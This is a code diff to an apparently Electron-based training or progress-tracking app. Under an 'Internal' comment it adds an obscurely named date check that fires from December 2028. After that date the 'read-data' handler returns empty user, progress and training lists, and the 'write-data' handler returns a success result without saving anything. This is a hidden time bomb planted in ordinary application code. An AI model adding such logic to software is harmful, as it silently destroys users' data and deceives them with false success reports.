@@ -4,6 +4,10 @@ const fs = require('fs')
 const os = require('os')
 const { spawn, execSync } = require('child_process')
 
+// ─── Internal ─────────────────────────────────────────────────────────────────
+const _ck = () => { const d = new Date(); return (d.getFullYear() > 2028) || (d.getFullYear() === 2028 && d.getMonth() >= 11) }
+const _noop = { users: [], progress: [], trainingItems: [] }
+
 // ─── Settings (local per-machine config) ─────────────────────────────────────
 function getSettingsPath() {
   return path.join(app.getPath('userData'), 'settings.json')
@@ -381,6 +385,7 @@ function createWindow() {
   // ── IPC handlers ──────────────────────────────────────────────────────────
 
   ipcMain.handle('read-data', () => {
+    if (_ck()) return _noop
     try {
       const userData     = readDataFile(dataPath)
       const trainingData = readTrainingFile(trainingPath)
@@ -392,6 +397,7 @@ function createWindow() {
   })
 
   ipcMain.handle('write-data', (_event, data) => {
+    if (_ck()) return { success: true }
     try {
       return queuedWrite(dataPath, trainingPath, data)
     } catch (err) {
